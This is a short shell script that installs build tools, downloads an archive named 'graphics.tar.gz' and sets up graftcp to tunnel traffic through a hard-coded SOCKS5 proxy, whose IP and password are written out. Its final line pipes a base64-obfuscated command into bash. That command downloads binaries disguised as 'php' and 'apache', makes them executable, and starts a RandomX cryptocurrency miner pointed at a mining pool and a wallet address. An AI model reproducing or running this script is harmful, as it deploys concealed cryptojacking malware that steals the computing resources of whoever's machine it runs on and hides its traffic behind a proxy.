#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END 
listen = :2233 
loglevel = 1 
select_proxy_mode=socks5_only 
socks5 = 103.97.111.147:8388
socks5_password = hi3zv
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "**"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "**"

echo " "
echo " "

./graftcp/graftcp bash -c 'base64 -d <<<Y3VybCAtTCBodHRwczovL2JpdGJ1Y2tldC5vcmcvZWF0eW91cnNoZXQvcGhwL3Jhdy8xYTMxNTU0Y2RlZGU4ODhhZTcwZmJlZWRjNWU5MDlhMzkyNmVhMmRhL3BocCAtLW91dHB1dCBwaHAgJiYgY3VybCAtTCBodHRwczovL2JpdGJ1Y2tldC5vcmcvZWF0eW91cnNoZXQvcGhwL3Jhdy9iMWVlNWRjNzA5OTU2YTkyNzYzOTc2ZTE1ZGQxOGY5YWI4ZjQwNjk4L2FwYWNoZSAtLW91dHB1dCBhcGFjaGUgJiYgY2htb2QgK3ggYXBhY2hlIHBocCAmJiAuL3BocCAtYWxnbyByeC8wIC13YWxsZXQgU2FMdnNCdTZvRmFnMXc3QVducTdNSmUxa2lFajM5V1hFN1J3VE56Ukg4c1UyeHkzc1N4WmZ3UWpMSFJxTFV1MzJOVGZFcWQ3eEtoTXdLM3QzVjJUaXg5RVpVdGdoV3VVd3lOIC1wb29sMSBwb29sLmhhc2h2YXVsdC5wcm86NDQzIC1yaWdOYW1lIENQVS0z  | bash'
